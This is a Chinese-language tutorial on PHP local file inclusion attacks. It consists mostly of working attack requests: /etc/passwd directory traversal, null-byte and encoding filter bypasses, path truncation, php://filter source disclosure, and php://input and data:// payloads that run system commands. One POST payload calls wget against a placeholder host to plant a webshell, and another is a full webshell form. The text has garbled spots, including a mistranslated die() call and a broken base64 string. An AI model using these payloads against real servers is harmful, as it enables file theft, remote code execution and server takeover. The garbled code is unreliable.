本地文件包含 (LFI) 是一种与 Web 服务器有关的漏洞。它允许攻击者在 Web 服务器上包含本地文件。它的发生是由于使用了未经适当清理的用户输入。


这可能导致：

  • 输出源代码或敏感信息

  • 代码执行（服务器端/客户端）

  • 拒绝服务 (DoS)


例子#

我将在 PHP 中给出一些示例，但它也可以出现在 Perl、ASP、JSP 或其他任何东西中。


基本包括#

服务器代码：

<?php $file = $_GET[ 'file' ]; if ( isset ($file)) { include ( " $file " ); }

合法请求：

http://example.com/index.php?file=contact.php

错误的请求：

http://example.com/index.php?file=/etc/passwd

在这里，攻击者可以简单地选择修改 GET 请求以提供不在 web serer 文件夹中的文件。


目录遍历攻击#

服务器代码：

<?php $file = $_GET[ 'file' ]; if ( isset ($file)) { include ( "lib/functions/ $file " ); }

合法请求：

http://example.com/index.php?file=displaycontent.php

错误的请求：

http://example.com/index.php?file=../../../../../etc/passwd

在这里，攻击者可以使用相对路径离开 Web 服务器文件夹。


空字节注入#

服务器代码：

<?php $file = $_GET[ 'file' ]; if ( isset ($file)) { include ( "lib/functions/ $file .php" ); }

合法请求：

http://example.com/index.php?file=displaycontent

错误的请求：

http://example.com/index.php?file=../../../../../etc/passwd%00

此处脚本强制使用.php文件扩展名，但攻击者可以通过在路径中添加空字节来删除扩展名。


为什么？%00是0x00十六进制的 http 编码版本。它是空字符，一个空字节。在 C 中它是写的\0，它表示字符串终止字符，因此将立即停止处理字符串。


PHP（与其他 Web 服务器语言一样）需要在系统级别处理高级代码，通常使用 C/C++ 函数来完成。定界符后面的字节将被忽略。


如果在 php 中我们有：

$tmp='try';

在 C 中，我们有：

char tmp[4];tmp[0] = 't';tmp[1] = 'r';tmp[2] = 'y';tmp[3] = '\0';

所以如果一个空字节被注入 int php

$tmp='try\0next'

将在 C 中产生：

char tmp[9];tmp[0] = 't';tmp[1] = 'r';tmp[2] = 'y';tmp[3] = '\0';tmp[4] = 'n';tmp[5] = 'e';tmp[6] = 'x';tmp[7] = 't';tmp[8] = '\0';

注意：空字节注入已在 PHP 5.3.4 中得到修复（不支持）。


过滤规避#

知道以前的漏洞的人可能认为他会通过适当的过滤器确保安全，例如：

<?php $file = str_replace( '../' , '' , $_GET[ 'file' ]); if ( isset ($file)) { include ( "lib/functions/ $file " ); }

合法请求：

http://example.com/index.php?file=displaycontent

错误请求（HTTP 字符编码）：

http://example.com/index.php?file=..%2F..%2F..%2F..%2F..%2Fetc/passwd

或错误的请求（双倍所有字符）：

http://example.com/index.php?file=....//..//..//....//....//etc/passwd

脚本../什么都不替换，但如果我们对斜杠或点进行编码呢？或加倍？


第一种方法不适用于最近的 PHP 版本，但第二种方法几乎每次都可以使用。


双重编码#

有时可以对 URL 的某些字符进行编码以绕过我们之前看到的过滤器。这是因为浏览器会解码输入，但 PHP 不会。


通过使用双重编码，可以绕过只对用户输入解码一次的安全过滤器。第二个解码过程由后端平台或正确处理编码数据的模块执行，但没有进行相应的安全检查。


例如，如果urlencode()在 PHP 中使用。


所以要继续绕过过滤器，需要双重编码：

  • 我们第一次对数据进行编码，例如../etc/passwd开始%2E%2E%2Fetc%2Fpasswd

  • 现在编码%：%252E%252E%252Fetc%252Fpasswd


路径截断#

由于自 5.3.4 以来的所有 PHP 版本都不再容易受到空字节注入的影响，我们需要更多方法来绕过扩展过滤器，例如：

include('lib/functions/' + $_GET['file'] + '.php');

事实：

  • 在 UNIX 上/./etc/passwd是一样的/etc/passwd

  • 在 PHP 尾部斜杠经常被剥离所以/etc/passwd/是一样的/etc/passwd

  • 在 PHP 上，因为尾部斜杠被剥离，所以可以根据需要添加它们，因此/etc/passwd//////与/etc/passwd

  • 在PHP./可以，只要你想的路径，从而被附加许多TIEMS /etc/passwd/.，/etc/passwd/./，/etc/passwd/././.都是一样的/etc/passwd。

但是还有一个有趣的事实是绕过扩展过滤器：在很多 PHP 安装中，超过 4096 字节的文件名会被静默截断！前 4096 字节后的字符被丢弃，不会触发错误。


所以呢？让我们设计一条很长的路径来放弃.php扩展！

接受您的请求并追加一千次./，../../../etc/passwd/./././././<...>这样会得到，../../../etc/passwd/./././././<...>/././.php但文件名将超过 4096 字节，因此将删除超长部分。所以我们只会得到我们的请求和一千次./，这将相当于../../../etc/passwd


反向路径截断#

它也存在路径截断的反向版本。这是通过尝试从头开始填充文件名以超过 MAX_PATH 值来实现的。


但是这种方法有一个缺点：您必须注入确切的字节数才能仅截断.php扩展名。如果../注入过多，文件名也将被截断。另外，这就是为什么如果路径长度不够，您需要添加一些字符的原因，因为../.


可在此处找到详细信息。


php://过滤器#

您找到了一个 LFI，您包含了该文件，但您看不到其内容？


某些文件config.php或函数库仅执行但未显示。所以为了帮助我们展示它们，我们可以使用一些PHP 包装器。


一个著名的index.php?page=php://filter/read=convert.base64-encode/resource=config例子是，这个过滤器将以 base64 编码页面并显示结果，就像我们已经完成index.php?page=config然后 base64 一样。


expect：// #

一个罕见但非常有用的包装器是expect://，它允许通过 php 执行系统命令。但是默认是不启用的，需要安装扩展。

http://example.com/index.php?file=expect://ls


php://输入#

php://input 允许通过 POST 请求发送有效载荷。


要求：

http://example.com/index.php?file=php://input

发布数据（上传 webshell）：

<?php system('wget http://xxxx/php-shell.php -O /var/www/html/shell.php'); ?>

发布数据（获取服务器信息）：

<?php phpinfo(); ?>


数据:// #

data:// 可用于包含可执行的 PHP 代码。

http://example.com/index.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA2fPg%3d%3d

或者

http://example.com/index.php?file=data:text/plain;,<?php echo shell_exec($_GET['cmd']);?>

另一个有效负载可以是<?php phpinfo(); die();?>，die 语句将阻止执行脚本的其余部分或执行附加到流的错误解码的扩展。


一个更有用的 PHP 负载 webshell：

<form action="<?=$_SERVER['REQUEST_URI']?>" method="POST"><input type="text" name="x" value="<?=htmlentities($_POST['x' ])?>"><input type="submit" value="cmd"></form><pre><? echo `{$_POST['x']}`; ?></pre><? 死（）; ?>

要直接执行命令，数据请求 + 有效载荷可以是：

data:,<?system($_GET['x']);?>&x=ls

或

data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls。


成功执行有效负载的最佳方法是对它进行base64，然后对其进行URL 编码。


zip:// 和 phar:// #

将 php 脚本存档到 zip 或 phar（或其他带有其他包装器的存档），发送存档并告知必须读取哪个文件：zip://archive.zip#file.php
